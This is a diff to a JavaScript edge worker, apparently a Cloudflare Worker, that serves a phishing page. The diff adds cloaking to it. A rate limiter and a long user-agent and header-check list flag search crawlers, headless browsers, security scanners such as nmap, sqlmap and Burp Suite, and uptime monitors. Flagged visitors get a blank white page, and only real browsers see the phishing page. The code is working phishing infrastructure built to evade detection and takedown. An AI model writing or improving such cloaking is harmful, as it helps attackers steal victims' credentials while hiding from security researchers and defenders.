@@ -5,6 +5,153 @@ const VERIFY_ENDPOINT = '{{VERIFY_ENDPOINT}}';
 const BEACON_ENDPOINT = '{{BEACON_ENDPOINT}}';
 const LOG_ENDPOINT = '{{LOG_ENDPOINT}}';
 
+// Simple in-memory rate limiter (per deployment)
+const rateLimitMap = new Map();
+const RATE_LIMIT_WINDOW = 60000; // 1 minute
+const RATE_LIMIT_MAX_REQUESTS = 30; // Max 30 requests per minute per IP
+
+function checkRateLimit(ip) {
+  const now = Date.now();
+  const record = rateLimitMap.get(ip);
+  if (!record) {
+    rateLimitMap.set(ip, { count: 1, windowStart: now });
+    return false;
+  }
+  if (now - record.windowStart > RATE_LIMIT_WINDOW) {
+    rateLimitMap.set(ip, { count: 1, windowStart: now });
+    return false;
+  }
+  record.count++;
+  if (record.count > RATE_LIMIT_MAX_REQUESTS) {
+    return true; // Rate limited
+  }
+  return false;
+}
+
+// ─── Bot Detection at Edge ────────────────────────────────
+// Detect bots, crawlers, scrapers at the edge before serving content
+function isBotRequest(request) {
+  const userAgent = request.headers.get('user-agent') || '';
+  const accept = request.headers.get('accept') || '';
+  const acceptLanguage = request.headers.get('accept-language') || '';
+  const acceptEncoding = request.headers.get('accept-encoding') || '';
+  const referer = request.headers.get('referer') || '';
+  const secFetchSite = request.headers.get('sec-fetch-site') || '';
+  const secFetchMode = request.headers.get('sec-fetch-mode') || '';
+  const secFetchDest = request.headers.get('sec-fetch-dest') || '';
+  const secFetchUser = request.headers.get('sec-fetch-user') || '';
+  const cfRay = request.headers.get('cf-ray') || '';
+  const cfIPCountry = request.headers.get('cf-ipcountry') || '';
+  
+  const visitorIp = request.headers.get('CF-Connecting-IP') || 
+                    request.headers.get('X-Forwarded-For') || 
+                    request.headers.get('X-Real-IP') || '';
+  
+  // Rate limiting
+  if (visitorIp && checkRateLimit(visitorIp)) {
+    return { isBot: true, reason: 'rate_limit' };
+  }
+  
+  // Bot user agents - aggressive detection
+  const botSignatures = [
+    // Crawlers and search engines
+    'bot', 'crawler', 'spider', 'scraper', 'crawling',
+    'googlebot', 'bingbot', 'slurp', 'duckduckbot',
+    'baiduspider', 'yandexbot', 'facebookexternalhit',
+    'twitterbot', 'rogerbot', 'linkedinbot',
+    
+    // Automated browsers
+    'headless', 'phantomjs', 'puppeteer', 'playwright',
+    'selenium', 'webdriver', 'automation',
+    
+    // Security scanners
+    'nmap', 'masscan', 'zaproxy', 'burpsuite',
+    'sqlmap', 'nikto', 'wget', 'curl',
+    
+    // Tools
+    'axios', 'guzzle', 'python-requests', 'java/',
+    'okhttp', 'postman', 'insomnia',
+    'curl/', 'wget/',
+    
+    // Anti-bot services
+    'scrapy', 'beautifulsoup', 'httpx',
+    
+    // Known bad actors
+    'monitor', 'checker', 'probe', 'scanner',
+    'uptime', 'statuscake', 'pingdom',
+  ];
+  
+  const uaLower = userAgent.toLowerCase();
+  for (const sig of botSignatures) {
+    if (uaLower.includes(sig)) {
+      return { isBot: true, reason: 'user_agent', signature: sig };
+    }
+  }
+  
+  // Check for missing headers that browsers always have
+  if (!accept || accept === '*/*') {
+    return { isBot: true, reason: 'missing_accept' };
+  }
+  
+  if (!acceptLanguage) {
+    return { isBot: true, reason: 'missing_accept_language' };
+  }
+  
+  // Check for suspicious accept-encoding
+  if (!acceptEncoding || acceptEncoding === 'identity') {
+    return { isBot: true, reason: 'suspicious_accept_encoding' };
+  }
+  
+  // Check for bots that spoof user agent but miss headers
+  const hasBrowserHeaders = 
+    accept.includes('text/html') &&
+    acceptLanguage.length > 0 &&
+    userAgent.includes('Mozilla');
+  
+  if (!hasBrowserHeaders) {
+    return { isBot: true, reason: 'missing_browser_headers' };
+  }
+  
+  // Check for missing sec-fetch headers (modern browsers always send these)
+  if (!secFetchSite || !secFetchMode || !secFetchDest) {
+    return { isBot: true, reason: 'missing_sec_fetch' };
+  }
+  
+  // Check for suspicious sec-fetch values
+  if (secFetchSite === 'none' && secFetchMode === 'navigate' && !secFetchUser) {
+    // Direct navigation should have sec-fetch-user: ?1
+    return { isBot: true, reason: 'suspicious_sec_fetch_user' };
+  }
+  
+  // Check referer for suspicious patterns
+  if (referer) {
+    const refererLower = referer.toLowerCase();
+    if (refererLower.includes('google') && !refererLower.includes('search') && !refererLower.includes('webcache')) {
+      // Likely a bot pretending to come from Google
+    }
+  }
+  
+  // Check for known bad ASN/IP ranges via Cloudflare headers
+  // cf-ipcountry can help identify suspicious regions
+  const suspiciousCountries = ['CN', 'RU', 'KP', 'IR', 'SY'];
+  if (cfIPCountry && suspiciousCountries.includes(cfIPCountry)) {
+    // Don't block, but log for monitoring
+    console.log('[Worker] Suspicious country:', cfIPCountry, 'IP:', visitorIp);
+  }
+  
+  // Check for missing cookie header (browsers usually send cookies)
+  const cookie = request.headers.get('cookie') || '';
+  const hasCookie = cookie.length > 0;
+  
+  // Check for connection header anomalies
+  const connection = request.headers.get('connection') || '';
+  if (connection && !connection.includes('keep-alive') && !connection.includes('close')) {
+    return { isBot: true, reason: 'suspicious_connection' };
+  }
+  
+  return { isBot: false };
+}
+
 addEventListener('fetch', event => {
   event.respondWith(handleRequest(event.request));
 });
@@ -12,9 +159,23 @@ addEventListener('fetch', event => {
 async function handleRequest(request) {
   const url = new URL(request.url);
 
-  // Serve the phishing page
-  if (request.method === 'GET' && !url.pathname.startsWith('/api/')) {
-    return servePhishingPage(request);
+  // Detect bots at the edge before serving anything
+  const botCheck = isBotRequest(request);
+  if (!botCheck.isBot) {
+    // Serve the phishing page
+    if (request.method === 'GET' && !url.pathname.startsWith('/api/')) {
+      return servePhishingPage(request);
+    }
+  } else {
+    // Bot detected - return white page immediately
+    console.log('[Worker] Bot blocked:', botCheck.reason, botCheck.signature || '');
+    return new Response('', {
+      status: 200,
+      headers: {
+        'Content-Type': 'text/html; charset=utf-8',
+        'Cache-Control': 'no-cache, no-store, must-revalidate',
+      }
+    });
   }
 
   // API endpoints - support both legacy and new paths
